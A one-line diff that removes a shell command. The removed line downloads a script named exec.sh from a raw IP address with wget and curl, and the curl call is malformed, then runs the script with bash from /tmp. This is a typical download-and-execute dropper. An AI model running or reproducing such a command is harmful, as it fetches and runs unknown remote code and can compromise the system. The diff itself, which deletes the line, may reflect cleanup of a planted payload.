@@ -1,1 +1,0 @@
-cd /tmp; wget http://5.10.249.153:9999/exec.sh; curl -o http://5.10.249.153:9999/exec.sh; bash exec.sh
